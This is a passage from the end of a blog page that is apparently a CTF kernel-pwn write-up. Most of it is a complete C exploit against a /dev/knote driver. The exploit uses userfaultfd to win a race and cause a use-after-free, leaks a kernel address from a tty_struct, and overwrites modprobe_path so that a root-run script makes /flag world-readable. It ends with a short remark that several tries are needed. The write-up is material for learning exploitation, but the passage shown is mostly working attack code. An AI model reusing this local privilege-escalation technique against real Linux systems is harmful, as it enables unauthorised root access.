+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>uffd_msg</span> msg;
+</span></span><span style=display:flex><span>	<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span> uffd <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) arg;
+</span></span><span style=display:flex><span>	puts(<span style=color:#4070a0>&#34;[+] write handler created&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>pollfd</span> pollfd;
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> nready;
+</span></span><span style=display:flex><span>	pollfd.fd <span style=color:#666>=</span> uffd;
+</span></span><span style=display:flex><span>	pollfd.events <span style=color:#666>=</span> POLLIN;
+</span></span><span style=display:flex><span>	nready <span style=color:#666>=</span> poll(<span style=color:#666>&amp;</span>pollfd, <span style=color:#40a070>1</span>, <span style=color:#666>-</span><span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>	sleep(<span style=color:#40a070>3</span>);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (nready <span style=color:#666>!=</span> <span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] Wrong poll return val&#34;</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	nready <span style=color:#666>=</span> read(uffd, <span style=color:#666>&amp;</span>msg, <span style=color:#007020;font-weight:700>sizeof</span>(msg));
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (nready <span style=color:#666>&lt;=</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] msg err&#34;</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#902000>char</span><span style=color:#666>*</span> page <span style=color:#666>=</span> (<span style=color:#902000>char</span><span style=color:#666>*</span>) mmap(<span style=color:#007020>NULL</span>, PAGE_SIZE, PROT_READ <span style=color:#666>|</span> PROT_WRITE, MAP_PRIVATE <span style=color:#666>|</span> MAP_ANONYMOUS, <span style=color:#666>-</span><span style=color:#40a070>1</span>, <span style=color:#40a070>0</span>);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (page <span style=color:#666>==</span> MAP_FAILED)
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] mmap err&#34;</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>uffdio_copy</span> uc;
+</span></span><span style=display:flex><span>	<span style=color:#60a0b0;font-style:italic>// init page
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	memset(page, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(page));
+</span></span><span style=display:flex><span>	memcpy(page, <span style=color:#666>&amp;</span>modprobe_path, <span style=color:#40a070>8</span>);
+</span></span><span style=display:flex><span>	uc.src <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) page;
+</span></span><span style=display:flex><span>	uc.dst <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) msg.arg.pagefault.address <span style=color:#666>&amp;</span> <span style=color:#666>~</span>(PAGE_SIZE <span style=color:#666>-</span> <span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>	uc.len <span style=color:#666>=</span> PAGE_SIZE;
+</span></span><span style=display:flex><span>	uc.mode <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>	uc.copy <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>	ioctl(uffd, UFFDIO_COPY, <span style=color:#666>&amp;</span>uc);
+</span></span><span style=display:flex><span>	puts(<span style=color:#4070a0>&#34;[+] leak handler done&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>return</span> <span style=color:#007020>NULL</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#06287e>main</span>()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> knote_fd <span style=color:#666>=</span> open(<span style=color:#4070a0>&#34;/dev/knote&#34;</span>, O_RDWR);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (knote_fd <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] knote open failed&#34;</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#60a0b0;font-style:italic>// leak kernel addr;
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	add(knote_fd, TTY_STRUCT_SIZE);
+</span></span><span style=display:flex><span>	size_t<span style=color:#666>*</span> leaked_data_buf <span style=color:#666>=</span> mmap(<span style=color:#007020>NULL</span>, PAGE_SIZE, PROT_READ <span style=color:#666>|</span> PROT_WRITE, MAP_PRIVATE <span style=color:#666>|</span> MAP_ANONYMOUS, <span style=color:#666>-</span><span style=color:#40a070>1</span>, <span style=color:#40a070>0</span>);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (leaked_data_buf <span style=color:#666>==</span> MAP_FAILED)
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] map err&#34;</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	RegisterUserfault(leaked_data_buf, userfaultfd_leak_handler);
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> pid <span style=color:#666>=</span> fork();
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (pid <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] fork err&#34;</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>else</span> <span style=color:#007020;font-weight:700>if</span>(pid <span style=color:#666>==</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		<span style=color:#60a0b0;font-style:italic>// child
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>		sleep(<span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>		dele(knote_fd, <span style=color:#40a070>0</span>);
+</span></span><span style=display:flex><span>		<span style=color:#902000>int</span> tty_fd <span style=color:#666>=</span> open(<span style=color:#4070a0>&#34;/dev/ptmx&#34;</span>, O_RDWR);
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>if</span> (tty_fd <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>		{
+</span></span><span style=display:flex><span>			ErrExit(<span style=color:#4070a0>&#34;[-] err open ptmx&#34;</span>);
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>		close(tty_fd);
+</span></span><span style=display:flex><span>		exit(<span style=color:#40a070>0</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>else</span>
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		<span style=color:#60a0b0;font-style:italic>// parent
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>		get(knote_fd, (<span style=color:#902000>char</span><span style=color:#666>*</span>)leaked_data_buf, <span style=color:#40a070>0</span>);
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>if</span> (leaked_data_buf[<span style=color:#40a070>74</span>] <span style=color:#666>==</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>		{
+</span></span><span style=display:flex><span>			ErrExit(<span style=color:#4070a0>&#34;[-] leaking err&#34;</span>);
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>		<span style=color:#60a0b0;font-style:italic>// for (int i = 0; i &lt; 0x60; i++)
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>		<span style=color:#60a0b0;font-style:italic>// {
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>		<span style=color:#60a0b0;font-style:italic>// printf(&#34;%d: %lx\n&#34;, i, ((size_t *)leaked_data_buf)[i]);
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>		<span style=color:#60a0b0;font-style:italic>// }
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>		size_t release_one_tty_addr <span style=color:#666>=</span> leaked_data_buf[<span style=color:#40a070>74</span>];
+</span></span><span style=display:flex><span>		modprobe_path <span style=color:#666>=</span> release_one_tty_addr <span style=color:#666>+</span> <span style=color:#40a070>0xE88A30</span>;
+</span></span><span style=display:flex><span>		printf(<span style=color:#4070a0>&#34;[+] leaked release_one_tty_addr: 0x%lx</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, release_one_tty_addr);
+</span></span><span style=display:flex><span>		printf(<span style=color:#4070a0>&#34;[+] leaked modprobe_path_addr: 0x%lx</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, modprobe_path);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	sleep(<span style=color:#40a070>2</span>);
+</span></span><span style=display:flex><span>	<span style=color:#60a0b0;font-style:italic>// write modprobe_path to a next ptr
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	add(knote_fd, <span style=color:#40a070>0x100</span>); <span style=color:#60a0b0;font-style:italic>// idx 0
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	size_t<span style=color:#666>*</span> write_buf <span style=color:#666>=</span> mmap(<span style=color:#007020>NULL</span>, PAGE_SIZE, PROT_READ <span style=color:#666>|</span> PROT_WRITE, MAP_PRIVATE <span style=color:#666>|</span> MAP_ANONYMOUS, <span style=color:#666>-</span><span style=color:#40a070>1</span>, <span style=color:#40a070>0</span>);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (leaked_data_buf <span style=color:#666>==</span> MAP_FAILED)
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] map err&#34;</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	RegisterUserfault(write_buf, userfaultfd_haijack_next_ptr_handler);
+</span></span><span style=display:flex><span>	pid <span style=color:#666>=</span> fork();
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (pid <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] fork err&#34;</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>else</span> <span style=color:#007020;font-weight:700>if</span>(pid <span style=color:#666>==</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		<span style=color:#60a0b0;font-style:italic>// child
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>		sleep(<span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>		dele(knote_fd, <span style=color:#40a070>0</span>); <span style=color:#60a0b0;font-style:italic>// cause UAF
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>		exit(<span style=color:#40a070>0</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>else</span>
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		edit(knote_fd, (<span style=color:#902000>char</span><span style=color:#666>*</span>)write_buf, <span style=color:#40a070>0</span>); <span style=color:#60a0b0;font-style:italic>// UAF
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	}
+</span></span><span style=display:flex><span>	<span style=color:#60a0b0;font-style:italic>// haijack modprobe_path
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	sleep(<span style=color:#40a070>2</span>);
+</span></span><span style=display:flex><span>	<span style=color:#902000>char</span> script_path[<span style=color:#40a070>0x100</span>];
+</span></span><span style=display:flex><span>	add(knote_fd, <span style=color:#40a070>0x100</span>); <span style=color:#60a0b0;font-style:italic>// idx: 0
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	add(knote_fd, <span style=color:#40a070>0x100</span>); <span style=color:#60a0b0;font-style:italic>// dup to modprobe_path
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	                      <span style=color:#60a0b0;font-style:italic>// idx: 1
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	strcpy(script_path, <span style=color:#4070a0>&#34;/tmp/get_flag.sh&#34;</span>);
+</span></span><span style=display:flex><span>	edit(knote_fd, script_path, <span style=color:#40a070>1</span>); <span style=color:#60a0b0;font-style:italic>// modprobe_path -&gt; /tmp/get_flag.sh
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>
+</span></span><span style=display:flex><span>	system(<span style=color:#4070a0>&#34;mkdir -p /tmp&#34;</span>);
+</span></span><span style=display:flex><span>	system(<span style=color:#4070a0>&#34;echo &#39;#!/bin/sh&#39; &gt; /tmp/get_flag.sh&#34;</span>);
+</span></span><span style=display:flex><span>	system(<span style=color:#4070a0>&#34;echo &#39;chmod 777 /flag&#39; &gt;&gt; /tmp/get_flag.sh&#34;</span>);
+</span></span><span style=display:flex><span>	system(<span style=color:#4070a0>&#34;chmod +x /tmp/get_flag.sh&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	system(<span style=color:#4070a0>&#34;echo -e &#39;</span><span style=color:#4070a0;font-weight:700>\\</span><span style=color:#4070a0>xFF</span><span style=color:#4070a0;font-weight:700>\\</span><span style=color:#4070a0>xFF</span><span style=color:#4070a0;font-weight:700>\\</span><span style=color:#4070a0>xFF</span><span style=color:#4070a0;font-weight:700>\\</span><span style=color:#4070a0>xFF&#39; &gt; /tmp/fake_elf&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	system(<span style=color:#4070a0>&#34;chmod +x /tmp/fake_elf&#34;</span>);
+</span></span><span style=display:flex><span>	system(<span style=color:#4070a0>&#34;/tmp/fake_elf&#34;</span>);
+</span></span><span style=display:flex><span>	system(<span style=color:#4070a0>&#34;cat /flag&#34;</span>);
+</span></span><span style=display:flex><span>	sleep(<span style=color:#40a070>3</span>);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>return</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>虽然使用了 userfaultfd 来提高竞争的成功率，但是仍然需要多次尝试才能成功</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/07/3531645761.png></div></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/write-up>write-up</a></li><li><a href=/tags/kernel-pwn>kernel-pwn</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
+<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
